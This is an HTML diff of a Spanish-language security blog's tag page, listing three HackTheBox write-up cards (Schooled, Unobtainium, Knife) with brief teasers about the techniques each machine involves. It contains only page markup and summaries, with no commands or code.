+    <a class="smoothscroll badge badge-primary" href="/tags#sudo">sudo</a>               
+    
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary" href="/categories#htb">htb</a>                
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/schooled">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335banner.png" alt="HackTheBox - Schooled"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/schooled">HackTheBox - Schooled</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina FreeBSD nivel medio, linda locura, nos moveremos mucho por Moodle robando cookies, cambiando roles a los cuales no deberíamos cambiar e instalando plugins maliciosos. Crackearemos hashes y finalmente aprovecharemos...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">11 Sep 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/unobtainium">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338banner.png" alt="HackTheBox - Unobtainium"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/unobtainium">HackTheBox - Unobtainium</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel difícil. Explotaremos una app de Linux. Jugando con librerías de JavaScript, la infectaremos (Prototype Pollution en lodash) y haremos command-injection (en google-cloudstorage-commands). Y moveremos internamente muchas cosas...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">30 Aug 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/knife">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/knife/347banner.png" alt="HackTheBox - Knife"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/knife">HackTheBox - Knife</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel fácil, explotaremos PHP y jugaremos con la herramienta knife para ejecutar código Ruby como el usuario root (mediante sudo).
+
+</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">28 Aug 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+                
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/sh0x.png" class="newsletter-logo" alt="Sh0x blog"></span>
+        <p></p>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Sh0x blog 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+</body>
+</html>
